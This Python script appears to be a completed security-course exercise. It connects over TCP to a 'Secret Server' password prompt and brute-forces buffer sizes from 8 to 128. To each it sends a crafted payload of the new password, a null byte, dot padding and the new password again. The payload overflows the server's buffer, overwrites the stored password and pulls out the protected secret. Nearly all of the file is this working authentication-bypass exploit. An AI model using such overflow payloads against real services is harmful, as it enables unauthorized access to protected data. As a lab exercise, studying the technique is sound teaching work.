import argparse
import socket
import sys
import time

# implement this function
# add additional helper functions/classes if you need
def run_exploit(hostname, port):
    new_password = 'secret'  # The new password to overwrite the server's password
    password_length = len(new_password)

    # Iterate over possible BUFFSIZE values from 8 to 128
    for BUFFSIZE in range(8, 129):
        # Calculate padding_length to fit the payload structure
        padding_length = BUFFSIZE - password_length - 1 - password_length  # BUFFSIZE - len(new_password) - '\x00' - len(new_password)

        # Skip if padding_length is negative (invalid for current BUFFSIZE)
        if padding_length < 0:
            continue

        # Create the padding using '.' characters
        padding = '.' * padding_length

        # Construct the payload
        # [new_password][\x00][padding][new_password]\n
        payload = f"{new_password}\x00{padding}{new_password}\n"

        try:
            # Establish a TCP connection to the server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)  # Set a timeout of 2 seconds for socket operations
                s.connect((hostname, port))

                # Receive the initial server messages
                initial_response = s.recv(1024).decode()
                # Example initial_response: "Secret Server 1.0\nPassword:"

                # Send the crafted payload
                s.sendall(payload.encode())

                # Receive the server's response
                response = s.recv(4096).decode()

                # Check if the secret is revealed
                if "The secret is:" in response:
                    # Extract and return the secret
                    secret = response.split("The secret is: ")[1].strip()
                    return secret

        except socket.timeout:
            # Handle socket timeout (server did not respond in time)
            print(f"Connection timed out for BUFFSIZE={BUFFSIZE}.")
            continue
        except ConnectionRefusedError:
            # Handle connection refusal (server is not running or port is incorrect)
            print(f"Connection refused for BUFFSIZE={BUFFSIZE}.")
            continue
        except Exception as e:
            # Handle any other exceptions
            print(f"An error occurred for BUFFSIZE={BUFFSIZE}: {e}")
            continue

    # If the loop completes without finding the secret
    return "Secret not found."

# =================================================================
# Do not modify any lines below
# =================================================================

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("hostname", help="hostname or IP address")
    parser.add_argument("port", help="port number", type=int)
    args = parser.parse_args()
    print(f"Running exploit on {args.hostname}:{args.port}")
    secret = run_exploit(args.hostname, args.port)
    print(f"Secret = {secret}")

if __name__ == "__main__":
    main()
    